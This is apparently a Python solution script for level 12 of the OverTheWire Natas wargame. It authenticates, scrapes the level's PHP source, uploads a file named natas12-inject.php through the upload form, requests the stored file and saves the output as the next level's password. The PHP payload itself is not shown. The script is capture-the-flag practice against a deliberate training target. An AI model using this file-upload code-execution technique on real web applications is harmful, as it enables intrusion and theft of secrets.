import os
import requests

from requests.auth import HTTPBasicAuth

import bs4
import html

import pathlib
import re

# utilities
file = os.path.basename(__file__).split(".")
file = file[0]
file = file[file.find("natas")+5:]

level = int(file)

username = f"natas{level}"
password = None
website = f"http://{username}.natas.labs.overthewire.org/"

result = None

with open(f"./natas/password/natas{level:02}-password.txt", "r") as f:
    password = f.read()

def send_get_request(website: str, username: str = None, password: str = None, params: dict = None, headers: dict = None, cookies: dict = None, get_body: bool = True) -> tuple[requests.Response, bs4.Tag]:
    print(f"Sending <GET> request to {website}")
    
    if username and password:
        print(f"Username : {username}")
    
    if username and password:
        print(f"Password : {password}")
    
    print()

    r = requests.get(website, auth=HTTPBasicAuth(username, password), params=params, headers=headers, cookies=cookies)

    print("Parsing HTML", end="...")
    soup = bs4.BeautifulSoup(r.content, "html.parser")
    print("Done\n")

    if get_body:
        print("Retrieving <body> tag", end="...")
        soup = soup.find("body")
        print("Done\n")


    print(soup)
    print()

    return (r, soup)

def send_post_request(website: str, data: dict, username: str = None, password: str = None, params: dict = None, headers: dict = None, cookies: dict = None, files: dict = None, get_body: bool = True) -> tuple[requests.Response, bs4.Tag]:
    print(f"Sending <POST> request to {website}")
    
    if username and password:
        print(f"Username : {username}")
    
    if username and password:
        print(f"Password : {password}")
    
    print()

    r = requests.post(website, auth=HTTPBasicAuth(username, password), data=data, params=params, headers=headers, cookies=cookies, files=files)

    print("Parsing HTML", end="...")
    soup = bs4.BeautifulSoup(r.content, "html.parser")
    print("Done\n")

    if get_body:
        print("Retrieving <body> tag", end="...")
        soup = soup.find("body")
        print("Done\n")


    print(soup)
    print()

    return (r, soup)

def save_password(result: str, level: int = level) -> pathlib.Path:
    result = result.strip("\n")

    print(f"Password found : {result}\n")

    dir = f"./natas/password/natas{level+1:02}-password.txt"

    print(f"Saving to file {dir}", end="...")
    with open(dir, "w+") as f:
        f.write(result or "")
    print("Done")

    print()

    return pathlib.Path(dir)

def join_website_dir(website: str, *dir: str) -> str:
    dir = map(str, dir)

    res = website.strip("/")

    for d in dir:
        res += "/"
        res += d.strip("/")

    return res

def find_element(element: str, soup: bs4.BeautifulSoup | bs4.Tag , all: bool = False) -> bs4.Tag:
    print(f"Finding <{element}>", end="...")
    if all:
        res = soup.find_all(element)
    else:
        res = soup.find(element)
    print("Done\n")
    
    return res

def extract_php_code(source_soup: bs4.BeautifulSoup) -> pathlib.Path:
    dir = f"./natas/code/natas{level:02}.php"

    if os.path.exists(dir):
        return dir
    
    content = source_soup.get_text(separator="\n")
    content = "".join(filter(lambda c: not "//" in c, content.splitlines()))
    content = "".join([s if s.isprintable() else " " for s in content])
    content = content.replace("=$data['bgcolor']", "")

    print(f"Extracting PHP Code to {dir}", end="...")
    code = html.unescape(content)

    code = re.findall("<\?.*?\?>", code)
    code = [c[2:-2] for c in code if c[3] != "="]
    code = "".join(code)
    code = code.replace("php", "")
    
    with open(dir, "w+") as f:
        f.write("<?php\n" + code)

    print("Done")

    return pathlib.Path(dir)

# code starts here
response, soup = send_get_request(website=website, username=username, password=password)

source = find_element("a", soup)
source = source.attrs["href"]

source_response, source_soup = send_get_request(website=join_website_dir(website, source), username=username, password=password, get_body=False)

php_path = extract_php_code(source_soup=source_soup)

# format file with Ctrl+Shift+P > Format Document

dir = pathlib.Path(f"./natas/code/natas12-test.php")

test_response, test_soup = send_post_request(website=website, data={"MAX_FILE_SIZE": "1000", "filename": dir.name}, username=username, password=password, files={"uploadedfile": open(dir, "rb")})

link = find_element("a", test_soup)
link = link.attrs["href"]

test_response, test_soup = send_get_request(website=join_website_dir(website, link), username=username, password=password, get_body=False)

dir = pathlib.Path(f"./natas/code/natas12-inject.php")

inject_response, inject_soup = send_post_request(website=website, data={"MAX_FILE_SIZE": "1000", "filename": dir.name}, username=username, password=password, files={"uploadedfile": open(dir, "rb")})

link = find_element("a", inject_soup)
link = link.attrs["href"]

inject_response, inject_soup = send_get_request(website=join_website_dir(website, link), username=username, password=password, get_body=False)

result = inject_soup.get_text()

password_dir = save_password(result=result)